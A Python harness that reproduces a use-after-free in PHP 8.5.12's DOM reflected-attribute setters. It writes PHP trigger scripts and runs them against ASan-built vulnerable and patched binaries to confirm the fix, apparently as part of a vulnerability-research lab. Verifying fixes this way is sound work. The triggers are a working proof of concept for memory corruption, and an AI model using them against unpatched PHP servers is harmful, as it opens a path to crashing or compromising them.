#!/usr/bin/env python3
"""DOM reflected-attribute setter UAF: live attribute child wrapper after replacement.

Vendor regression case (8.5.13 ext/dom/tests/reflected_attribute_write_live_child.phpt)
names no CVE/GHSA in NEWS: "Fixed a use-after-free when reflected attribute
setters replace an attribute whose child still has a live wrapper."

8.5.12 element.c:160 and token_list.c:197/:437 call xmlSetNsProp() directly.
libxml frees the old attribute's child text node; the PHP wrapper for that text
node is still live, so reading $text->parentNode or $text->textContent dereferences
freed memory. The 8.5.13 fix adds dom_set_attribute_value() (php_dom.c:2348,
declared php_dom.h:118), which calls node_list_unlink(existing->children)
before xmlSetNsProp(), and routes those setters through it.

Usage: python3 php2shell-dom-reflected-attr.py VULN_BIN FIXED_BIN [OUTDIR]

Reproduction from a clean checkout:
  1. bash lab/php2shell/build-dom.sh 8.5.12     # dom-enabled ASan CLI build
  2. copy sapi/cli/php to OUTDIR/php-vuln
  3. patch -p1 -d lab/build/php-8.5.12-asan-dom \
       < lab/php2shell/dom-reflected-attribute-fix.patch
  4. make -j4 -C lab/build/php-8.5.12-asan-dom
  5. copy the relinked sapi/cli/php to OUTDIR/php-fixed-domattr
A same-base control binary (wake-51 php-fixed: 8.5.13 xml_serializer.c only,
no reflected-attribute fix) also fails every trigger case; the build-tree patch
above is the sole difference in the A/B reported here.

Local CLI processes only, no network. ASan leak detection off (PHP leaks at exit).
"""
import os
import pathlib
import subprocess
import sys

HEAD = '''<?php
function check(string $label, $doc, Closure $write): void {
    $element = $doc->documentElement;
    $text = $element->getAttributeNode('class')->firstChild;
    $write($element);
    echo $label, ": detached: ";
    var_dump($text->parentNode === null);
    echo $label, ": text: ";
    var_dump($text->textContent);
    echo $label, ": new value: ";
    var_dump($element->getAttribute('class'));
}
'''

TRIGGERS = {
    'legacy_class_name': '''
$doc = new DOMDocument();
$doc->loadXML('<root class="old"/>');
check('legacy className', $doc, static fn ($element) => $element->className = 'new');
''',
    'modern_class_name': '''
$doc = Dom\\XMLDocument::createFromString('<root class="old"/>');
check('modern className', $doc, static fn ($element) => $element->className = 'new');
''',
    'class_list_value': '''
$doc = Dom\\XMLDocument::createFromString('<root class="old"/>');
check('classList value', $doc, static fn ($element) => $element->classList->value = 'new');
''',
    'class_list_update': '''
$doc = Dom\\XMLDocument::createFromString('<root class="old"/>');
check('classList update', $doc, static fn ($element) => $element->classList->add('new'));
''',
    'id_property': '''
$doc = Dom\\XMLDocument::createFromString('<root class="old"/>');
$element = $doc->documentElement;
$element->id = 'old';
$text = $element->getAttributeNode('id')->firstChild;
$element->id = 'new';
echo "id: detached: ";
var_dump($text->parentNode === null);
echo "id: text: ";
var_dump($text->textContent);
echo "id: new value: ";
var_dump($element->id);
''',
}

# No attribute replacement: the wrapper stays attached, so both builds are clean.
CONTROL = '''
$doc = Dom\\XMLDocument::createFromString('<root class="old"/>');
$text = $doc->documentElement->getAttributeNode('class')->firstChild;
var_dump($text->textContent);
'''

CASES = [('control', CONTROL)] + sorted(TRIGGERS.items())

EXPECT = {
    'legacy_class_name': ['detached: bool(true)', 'text: string(3) "old"', 'new value: string(3) "new"'],
    'modern_class_name': ['detached: bool(true)', 'text: string(3) "old"', 'new value: string(3) "new"'],
    'class_list_value': ['detached: bool(true)', 'text: string(3) "old"', 'new value: string(3) "new"'],
    'class_list_update': ['detached: bool(true)', 'text: string(3) "old"', 'new value: string(7) "old new"'],
    'id_property': ['detached: bool(true)', 'text: string(3) "old"', 'new value: string(3) "new"'],
}


def run(binary, script, log):
    env = os.environ.copy()
    env['ASAN_OPTIONS'] = 'detect_leaks=0'
    cp = subprocess.run([str(binary), '-n', str(script)],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        timeout=120, env=env)
    text = cp.stdout.decode(errors='replace')
    log.write_text(text)
    return cp.returncode, text


def classify(rc, text):
    if 'AddressSanitizer' in text and 'use-after-free' in text:
        return 'ASAN_UAF'
    if 'AddressSanitizer' in text:
        return 'ASAN_OTHER'
    if rc != 0:
        return 'CRASH_NO_ASAN'
    return 'CLEAN'


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    vuln = pathlib.Path(sys.argv[1]).resolve()
    fixed = pathlib.Path(sys.argv[2]).resolve()
    outdir = pathlib.Path(sys.argv[3]).resolve() if len(sys.argv) > 3 else \
        pathlib.Path(__file__).resolve().parent.parent / 'build' / 'evidence' / 'w55-domattr'
    outdir.mkdir(parents=True, exist_ok=True)
    for binary in (vuln, fixed):
        if not binary.is_file():
            print(f'missing binary: {binary}')
            return 2

    results = {}
    for name, body in CASES:
        script = outdir / (name + '.php')
        script.write_text(HEAD + body)
        vrc, vtext = run(vuln, script, outdir / (name + '.vulnerable.log'))
        frc, ftext = run(fixed, script, outdir / (name + '.fixed.log'))
        vc, fc = classify(vrc, vtext), classify(frc, ftext)
        ok = fc == 'CLEAN' and all(s in ftext for s in EXPECT.get(name, ['string(3) "old"']))
        results[name] = (vc, fc, ok)
        print(f'{name:20s} vuln rc={vrc:3d} {vc:12s} | fixed rc={frc:3d} {fc:12s} output={ok}')

    confirmed = (
        all(results[n][0] == 'ASAN_UAF' and results[n][1] == 'CLEAN' and results[n][2]
            for n in TRIGGERS)
        and results['control'][0] == 'CLEAN' and results['control'][1] == 'CLEAN'
    )
    verdict = 'CONFIRMED' if confirmed else 'NOT CONFIRMED'
    (outdir / 'verdict.txt').write_text(
        f'VERDICT: {verdict}\n'
        f'vulnerable: {vuln}\nfixed: {fixed}\n'
        + ''.join(f'{n}: {v}/{f} output_ok={ok}\n' for n, (v, f, ok) in results.items()))
    print('VERDICT:', verdict)
    return 0 if confirmed else 1


if __name__ == '__main__':
    sys.exit(main())
